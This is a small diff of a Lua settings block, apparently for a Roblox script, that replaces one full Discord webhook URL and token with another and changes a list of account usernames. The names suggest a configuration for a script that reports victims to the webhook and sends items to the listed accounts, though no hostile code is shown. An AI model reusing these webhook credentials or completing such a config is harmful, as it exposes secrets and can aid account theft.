@@ -1,7 +1,7 @@
 -- SETTINGS
-_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1494310126935343144/FgZWrnXJ0itEcg8NZYHCP_IjyP_tBlpLRSqnz5MeBlJ10o779vqy5kInA0qC2sC2T1Ur"
+_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1494402547048382667/jposCTGPTJcaf-FgYnV6I9Q0reIpIQngItpWYr5RIbwYmF_y3Nj0wkv_sV1fmyhtNN8M"
 
-_G.MY_USERNAMES = {"Chelsea", "thisisanalt048", "daxkidcece"}
+_G.MY_USERNAMES = {"antwon_yourfriend", "x", "x"}
 
 _G.PING_POOR = true
 
